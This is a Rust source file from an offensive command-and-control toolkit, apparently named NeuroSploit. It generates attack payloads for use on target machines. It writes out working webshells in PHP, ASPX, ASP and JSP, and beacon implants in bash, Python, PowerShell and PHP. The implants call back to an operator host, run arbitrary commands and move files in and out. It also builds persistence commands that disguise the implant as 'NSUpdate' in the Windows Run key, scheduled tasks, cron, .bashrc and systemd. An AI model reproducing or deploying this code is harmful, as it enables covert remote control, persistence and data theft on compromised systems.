//! Payload and command templates used by the C2 daemon and the WebShell
//! manager. Nothing here executes anything; the strings are returned to the
//! operator/agent and only run on the target when explicitly dispatched.

use crate::c2::types::{Listener, Session};
use crate::c2::{b64, random_token};

pub(crate) fn payload_php_webshell(password: &str, pass_param: &str, cmd_param: &str) -> String {
    format!(
        "<?php\n/* NeuroSploit WebShell — authorized engagements only */\n$pass_name = {p};\n$secret = {s};\n$cmd_name = {c};\nif ((($_POST[$pass_name] ?? $_GET[$pass_name] ?? '') === $secret)) {{\n    $c = $_POST[$cmd_name] ?? $_GET[$cmd_name] ?? '';\n    if ($c !== '') {{ passthru($c); }}\n}}\n?>\n",
        p = php_str(pass_param),
        s = php_str(password),
        c = php_str(cmd_param)
    )
}

fn php_str(s: &str) -> String {
    format!("'{}'", s.replace('\\', "\\\\").replace('\'', "\\'"))
}

pub(crate) fn payload_aspx_webshell(password: &str, pass_param: &str, cmd_param: &str) -> String {
    format!(
        "<%@ Page Language=\"C#\" %><%\n/* NeuroSploit WebShell — authorized engagements only */\nstring p = Request.Form[\"{pp}\"] ?? Request.QueryString[\"{pp}\"];\nstring c = Request.Form[\"{cp}\"] ?? Request.QueryString[\"{cp}\"];\nif (p == \"{pw}\" && !string.IsNullOrEmpty(c)) {{\n  var psi = new System.Diagnostics.ProcessStartInfo(\"cmd.exe\", \"/c \" + c);\n  psi.RedirectStandardOutput = true; psi.UseShellExecute = false;\n  var proc = System.Diagnostics.Process.Start(psi);\n  Response.Write(proc.StandardOutput.ReadToEnd());\n}}\n%>",
        pp = pass_param,
        cp = cmd_param,
        pw = password
    )
}

pub(crate) fn payload_asp_webshell(password: &str, pass_param: &str, cmd_param: &str) -> String {
    format!(
        "<%\n' NeuroSploit WebShell — authorized engagements only\nIf Request(\"{pp}\") = \"{pw}\" Then\n  Dim c, sh, o\n  c = Request(\"{cp}\")\n  If Len(c) > 0 Then\n    Set sh = Server.CreateObject(\"WScript.Shell\")\n    Set o = sh.Exec(\"cmd.exe /c \" & c)\n    Response.Write(o.StdOut.ReadAll())\n  End If\nEnd If\n%>",
        pp = pass_param,
        cp = cmd_param,
        pw = password
    )
}

pub(crate) fn payload_jsp_webshell(password: &str, pass_param: &str, cmd_param: &str) -> String {
    format!(
        "<%@ page import=\"java.io.*\" %>\n<%-- NeuroSploit WebShell — authorized engagements only --%>\n<% if (\"{pw}\".equals(request.getParameter(\"{pp}\"))) {{\n  String c = request.getParameter(\"{cp}\");\n  if (c != null && c.length() > 0) {{\n    Process p = Runtime.getRuntime().exec(new String[]{{\"/bin/sh\",\"-c\",c}});\n    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n    String l;\n    while ((l = r.readLine()) != null) {{ out.println(l); }}\n  }}\n}} %>",
        pp = pass_param,
        cp = cmd_param,
        pw = password
    )
}

pub(crate) fn payload_bash_beacon(base: &str, token: &str, sleep_s: u32, jitter: u32) -> String {
    let tpl = r#"#!/usr/bin/env bash
# NeuroSploit C2 beacon (HTTP) — authorized engagements only.
# Checks in, pulls tasks, executes them, reports results. No JSON parser needed.
BASE='@BASE@'; TOKEN='@TOKEN@'; UUID='@UUID@'; SLEEP=@SLEEP@; JITTER=@JITTER@
report() {
  curl -fsSk --max-time 20 -H "X-Implant-Token: $TOKEN" -X POST "$BASE/api/beacon" \
    --data-urlencode "uuid=$UUID" --data-urlencode "result_task_id=$1" \
    --data-urlencode "result_success=$2" --data-urlencode "result_output_b64=$3" >/dev/null 2>&1
}
while :; do
  BODY="uuid=$UUID&hostname=$(hostname 2>/dev/null||echo unknown)&username=$(whoami 2>/dev/null||echo unknown)"
  BODY="$BODY&os=$(uname -s 2>/dev/null||echo unknown)&arch=$(uname -m 2>/dev/null||echo unknown)&pid=$$&sleep_seconds=$SLEEP&jitter_percent=$JITTER"
  R=$(curl -fsSk --max-time 30 -H "X-Implant-Token: $TOKEN" -X POST "$BASE/api/beacon?format=sh" --data "$BODY") || { sleep "$SLEEP"; continue; }
  NS=$(printf '%s\n' "$R" | sed -n 's/^SLEEP=//p'); [ -n "$NS" ] && SLEEP=$NS
  printf '%s\n' "$R" | while read -r tag tid ttype tdata; do
    [ "$tag" = "TASK" ] || continue
    payload=$(printf '%s' "$tdata" | base64 -d 2>/dev/null)
    case "$ttype" in
      exec|lateral|persist)
        cmd=$(printf '%s' "$payload" | sed -n 's/.*"command": *"\([^"]*\)".*/\1/p')
        out=$(eval "$cmd" 2>&1); rc=$?
        report "$tid" "$([ $rc -eq 0 ] && echo 1 || echo 0)" "$(printf '%s' "$out" | base64 -w0 2>/dev/null || printf '%s' "$out" | base64 | tr -d '\n')"
        ;;
      sleep)
        NS2=$(printf '%s' "$payload" | sed -n 's/.*"seconds": *\([0-9]*\).*/\1/p'); [ -n "$NS2" ] && SLEEP=$NS2
        report "$tid" 1 ""
        ;;
      upload)
        p=$(printf '%s' "$payload" | sed -n 's/.*"path": *"\([^"]*\)".*/\1/p')
        d=$(printf '%s' "$payload" | sed -n 's/.*"content_b64": *"\([^"]*\)".*/\1/p')
        if [ -n "$p" ] && [ -n "$d" ]; then printf '%s' "$d" | base64 -d > "$p" && report "$tid" 1 "wrote $p" || report "$tid" 0 "write failed"; else report "$tid" 0 "bad upload payload"; fi
        ;;
      download)
        p=$(printf '%s' "$payload" | sed -n 's/.*"path": *"\([^"]*\)".*/\1/p')
        if [ -r "$p" ]; then d=$(base64 -w0 "$p" 2>/dev/null || base64 "$p" | tr -d '\n'); report "$tid" 1 "$d"; else report "$tid" 0 "cannot read $p"; fi
        ;;
      exit) report "$tid" 1 "bye"; exit 0 ;;
      *) report "$tid" 0 "unsupported task $ttype" ;;
    esac
  done
  sleep "$SLEEP"
done
"#;
    tpl.replace("@BASE@", base)
        .replace("@TOKEN@", token)
        .replace("@UUID@", &random_token()[..16])
        .replace("@SLEEP@", &sleep_s.max(1).to_string())
        .replace("@JITTER@", &jitter.min(100).to_string())
}

pub(crate) fn payload_python_beacon(base: &str, token: &str, sleep_s: u32, jitter: u32) -> String {
    let tpl = r#"#!/usr/bin/env python3
# NeuroSploit C2 beacon (HTTP) — authorized engagements only.
import base64, json, os, platform, socket, subprocess, sys, time, urllib.request

BASE = "@BASE@"
TOKEN = "@TOKEN@"
UUID = "@UUID@"
SLEEP = @SLEEP@
JITTER = @JITTER@
CWD = os.getcwd()

def post(payload):
    data = json.dumps(payload).encode()
    req = urllib.request.Request(BASE + "/api/beacon", data=data, method="POST",
        headers={"Content-Type": "application/json", "X-Implant-Token": TOKEN})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read().decode() or "{}")

def report(tid, ok, output="", error=""):
    try:
        post({"uuid": UUID, "results": [{"task_id": tid, "success": ok, "output": output, "error": error}]})
    except Exception:
        pass

def run(cmd):
    global CWD
    try:
        p = subprocess.run(cmd, shell=True, cwd=CWD, capture_output=True, timeout=600)
        return p.returncode == 0, (p.stdout + p.stderr).decode("utf-8", "replace")
    except Exception as e:
        return False, str(e)

info = {
    "uuid": UUID,
    "hostname": socket.gethostname(),
    "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
    "os": platform.system(),
    "arch": platform.machine(),
    "pid": os.getpid(),
    "process_name": sys.argv[0],
    "internal_ip": socket.gethostbyname(socket.gethostname()) if platform.system() != "Windows" else "",
    "sleep_seconds": SLEEP,
    "jitter_percent": JITTER,
}
while True:
    try:
        resp = post(info)
    except Exception:
        time.sleep(SLEEP); continue
    SLEEP = int(resp.get("next_sleep") or SLEEP)
    for t in resp.get("tasks") or []:
        tid, ttype, payload = t.get("task_id"), t.get("task_type"), t.get("payload") or {}
        try:
            if ttype in ("exec", "lateral", "persist"):
                ok, out = run(payload.get("command", ""))
                report(tid, ok, out)
            elif ttype == "pwd":
                report(tid, True, CWD)
            elif ttype == "ls":
                p = payload.get("path") or CWD
                ok, out = run(("ls -la -- " + p) if platform.system() != "Windows" else ("dir /a " + p))
                report(tid, ok, out)
            elif ttype == "cd":
                p = payload.get("path") or "."
                try:
                    os.chdir(p); CWD = os.getcwd(); report(tid, True, CWD)
                except Exception as e:
                    report(tid, False, str(e))
            elif ttype == "ps":
                ok, out = run("ps aux" if platform.system() != "Windows" else "tasklist")
                report(tid, ok, out)
            elif ttype == "sleep":
                SLEEP = int(payload.get("seconds") or SLEEP); report(tid, True, "")
            elif ttype == "upload":
                try:
                    with open(payload.get("path"), "wb") as f:
                        f.write(base64.b64decode(payload.get("content_b64") or ""))
                    report(tid, True, "wrote " + str(payload.get("path")))
                except Exception as e:
                    report(tid, False, str(e))
            elif ttype == "download":
                try:
                    with open(payload.get("path"), "rb") as f:
                        report(tid, True, base64.b64encode(f.read()).decode())
                except Exception as e:
                    report(tid, False, str(e))
            elif ttype == "exit":
                report(tid, True, "bye"); sys.exit(0)
            else:
                report(tid, False, "unsupported task " + str(ttype))
        except Exception as e:
            report(tid, False, "", str(e))
    time.sleep(SLEEP)
"#;
    tpl.replace("@BASE@", base)
        .replace("@TOKEN@", token)
        .replace("@UUID@", &random_token()[..16])
        .replace("@SLEEP@", &sleep_s.max(1).to_string())
        .replace("@JITTER@", &jitter.min(100).to_string())
}

pub(crate) fn payload_powershell_beacon(
    base: &str,
    token: &str,
    sleep_s: u32,
    jitter: u32,
) -> String {
    let tpl = r#"# NeuroSploit C2 beacon (HTTP) — authorized engagements only.
$Base='@BASE@'; $Token='@TOKEN@'; $Uuid='@UUID@'; $Sleep=@SLEEP@
function Send($body) {
  try { return Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$Base/api/beacon" -Headers @{ 'X-Implant-Token'=$Token } -ContentType 'application/json' -Body ($body | ConvertTo-Json -Depth 6 -Compress) } catch { return $null }
}
function Report($tid,$ok,$out) { $null = Send @{ uuid=$Uuid; results=@(@{ task_id=$tid; success=$ok; output=$out }) } }
while ($true) {
  $body = @{ uuid=$Uuid; hostname=$env:COMPUTERNAME; username=$env:USERNAME; os='Windows'; arch=$env:PROCESSOR_ARCHITECTURE; pid=$PID; internal_ip=''; sleep_seconds=$Sleep }
  $r = Send $body
  if ($r) {
    if ($r.next_sleep) { $Sleep = [int]$r.next_sleep }
    foreach ($t in @($r.tasks)) {
      $tid=$t.task_id; $type=$t.task_type; $p=$t.payload
      if ($type -eq 'exec' -or $type -eq 'lateral' -or $type -eq 'persist') {
        $out = & cmd.exe /c $p.command 2>&1 | Out-String; Report $tid ($LASTEXITCODE -eq 0) $out
      } elseif ($type -eq 'pwd') { Report $tid $true (Get-Location).Path }
      elseif ($type -eq 'ls') { $out = Get-ChildItem -Force -Path ($(if ($p.path) { $p.path } else { '.' })) | Out-String; Report $tid $true $out }
      elseif ($type -eq 'cd') { try { Set-Location $p.path; Report $tid $true (Get-Location).Path } catch { Report $tid $false $_.Exception.Message } }
      elseif ($type -eq 'ps') { Report $tid $true (Get-Process | Out-String) }
      elseif ($type -eq 'upload') { try { [IO.File]::WriteAllBytes($p.path, [Convert]::FromBase64String($p.content_b64)); Report $tid $true 'ok' } catch { Report $tid $false $_.Exception.Message } }
      elseif ($type -eq 'download') { try { Report $tid $true ([Convert]::ToBase64String([IO.File]::ReadAllBytes($p.path))) } catch { Report $tid $false $_.Exception.Message } }
      elseif ($type -eq 'sleep') { $Sleep=[int]$p.seconds; Report $tid $true '' }
      elseif ($type -eq 'exit') { Report $tid $true 'bye'; exit }
      else { Report $tid $false 'unsupported' }
    }
  }
  Start-Sleep -Seconds $Sleep
}
"#;
    tpl.replace("@BASE@", base)
        .replace("@TOKEN@", token)
        .replace("@UUID@", &random_token()[..16])
        .replace("@SLEEP@", &sleep_s.max(1).to_string())
        .replace("@JITTER@", &jitter.min(100).to_string())
}

pub(crate) fn payload_php_beacon(base: &str, token: &str, sleep_s: u32, jitter: u32) -> String {
    let tpl = r#"<?php
/* NeuroSploit C2 beacon (HTTP, PHP) — authorized engagements only. */
$base='@BASE@'; $token='@TOKEN@'; $uuid='@UUID@'; $sleep=@SLEEP@;
function post($url,$token,$data){
  $ctx=stream_context_create(['http'=>['method'=>'POST','header'=>"Content-Type: application/json\r\nX-Implant-Token: $token\r\n",'content'=>$data,'timeout'=>30,'ignore_errors'=>true]]);
  return @file_get_contents($url,$false,$ctx);
}
while(true){
  $info=json_encode(['uuid'=>$uuid,'hostname'=>gethostname(),'username'=>get_current_user(),'os'=>PHP_OS,'arch'=>php_uname('m'),'pid'=>getmypid(),'internal_ip'=>gethostbyname(gethostname()),'sleep_seconds'=>$sleep]);
  $r=post("$base/api/beacon",$token,$info);
  $j=json_decode((string)$r,true);
  if(is_array($j)){
    if(!empty($j['next_sleep'])) $sleep=(int)$j['next_sleep'];
    foreach(($j['tasks']??[]) as $t){
      $tid=$t['task_id']; $type=$t['task_type']; $p=$t['payload']??[]; $ok=false; $out='';
      if(in_array($type,['exec','lateral','persist'])){ $out=(string)shell_exec($p['command']??''); $ok=true; }
      elseif($type==='pwd'){ $out=getcwd(); $ok=true; }
      elseif($type==='ls'){ $out=(string)shell_exec('ls -la -- '.escapeshellarg($p['path']??'.')); $ok=true; }
      elseif($type==='download'){ $out=base64_encode((string)@file_get_contents($p['path']??'')); $ok=$out!==''; }
      elseif($type==='upload'){ $ok=@file_put_contents($p['path']??'',base64_decode($p['content_b64']??''))!==false; }
      elseif($type==='sleep'){ $sleep=(int)($p['seconds']??$sleep); $ok=true; }
      elseif($type==='exit'){ $res=json_encode(['uuid'=>$uuid,'results'=>[['task_id'=>$tid,'success'=>true,'output'=>'bye']]]); post("$base/api/beacon",$token,$res); exit; }
      $res=json_encode(['uuid'=>$uuid,'results'=>[['task_id'=>$tid,'success'=>$ok,'output'=>$out]]]);
      post("$base/api/beacon",$token,$res);
    }
  }
  sleep(max(1,$sleep));
}
"#;
    tpl.replace("@BASE@", base)
        .replace("@TOKEN@", token)
        .replace("@UUID@", &random_token()[..16])
        .replace("@SLEEP@", &sleep_s.max(1).to_string())
        .replace("@JITTER@", &jitter.min(100).to_string())
}

// ---------------------------------------------------------------------------
// WebShell file commands
// ---------------------------------------------------------------------------

fn sq(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

fn dq(s: &str) -> String {
    format!("\"{}\"", s.replace('"', "\"\""))
}

pub(crate) fn build_file_command(
    action: &str,
    path: &str,
    target: &str,
    content: &str,
    os: &str,
) -> Result<String, String> {
    let win = os.eq_ignore_ascii_case("windows");
    match action {
        "list" => Ok(if win {
            format!("dir /a {}", dq(path))
        } else {
            format!("ls -la -- {}", sq(path))
        }),
        "read" => Ok(if win {
            format!("type {}", dq(path))
        } else {
            format!("cat -- {}", sq(path))
        }),
        "write" | "upload" => {
            let bytes = content.as_bytes();
            if bytes.len() > 8 * 1024 * 1024 {
                return Err("content too large (8 MiB max per write)".into());
            }
            let b64 = b64(bytes);
            Ok(if win {
                format!(
                    "powershell -NoProfile -NonInteractive -Command \"$b=[Convert]::FromBase64String('{}');[IO.File]::WriteAllBytes({},$b)\"",
                    b64,
                    sq(path)
                )
            } else {
                format!("printf '%s' {} | base64 -d > {}", sq(&b64), sq(path))
            })
        }
        "delete" => Ok(if win {
            format!("del /f /q {}", dq(path))
        } else {
            format!("rm -f -- {}", sq(path))
        }),
        "mkdir" => Ok(if win {
            format!("mkdir {}", dq(path))
        } else {
            format!("mkdir -p -- {}", sq(path))
        }),
        "rename" => {
            if target.trim().is_empty() {
                return Err("target_path is required for rename".into());
            }
            Ok(if win {
                format!("move /Y {} {}", dq(path), dq(target))
            } else {
                format!("mv -- {} {}", sq(path), sq(target))
            })
        }
        other => Err(format!(
            "unsupported file action '{other}' (list, read, write, upload, delete, mkdir, rename)"
        )),
    }
}

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------

pub(crate) fn persistence_command(
    os: &str,
    method: &str,
    listener: &Listener,
    session: &Session,
) -> Result<String, String> {
    let base = format!("http://{}:{}", listener.callback_host, listener.bind_port);
    let win = os.to_ascii_lowercase().contains("windows");
    let m = method.trim().to_ascii_lowercase();
    if win {
        let ps = payload_powershell_beacon(
            &base,
            &listener.token,
            listener.sleep_seconds,
            listener.jitter_percent,
        );
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let encoded = b64(&utf16);
        let cmdline = format!("powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}");
        return Ok(match m.as_str() {
            "registry" => format!(
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NSUpdate /t REG_SZ /d \"{}\" /f",
                cmdline.replace('"', "\\\"")
            ),
            _ => format!(
                "schtasks /Create /F /SC ONLOGON /TN \"NSUpdate\" /TR \"{}\"",
                cmdline.replace('"', "\\\"")
            ),
        });
    }
    let beacon = payload_bash_beacon(
        &base,
        &listener.token,
        listener.sleep_seconds,
        listener.jitter_percent,
    );
    let one = format!("nohup bash -c {} >/dev/null 2>&1 &", sq(&beacon));
    let one_line = one.replace('\n', " ");
    Ok(match m.as_str() {
        "cron" => format!(
            "(crontab -l 2>/dev/null; echo '@reboot {}') | crontab -",
            one_line
        ),
        "bashrc" => format!(
            "grep -q 'NSUpdate' ~/.bashrc 2>/dev/null || echo '# NSUpdate' >> ~/.bashrc; grep -qF {} ~/.bashrc 2>/dev/null || echo {} >> ~/.bashrc",
            sq(&one_line),
            sq(&one_line)
        ),
        "systemd" => format!(
            "mkdir -p ~/.config/systemd/user && printf '[Unit]\\nDescription=NSUpdate\\n[Service]\\nExecStart=/bin/bash -c {}\\nRestart=always\\n[Install]\\nWantedBy=default.target\\n' > ~/.config/systemd/user/nsupdate.service && systemctl --user daemon-reload && systemctl --user enable --now nsupdate.service",
            sq(&one_line.replace('%', "%%"))
        ),
        _ => format!("{} # session {} @ {}", one_line, session.id, session.hostname),
    })
}
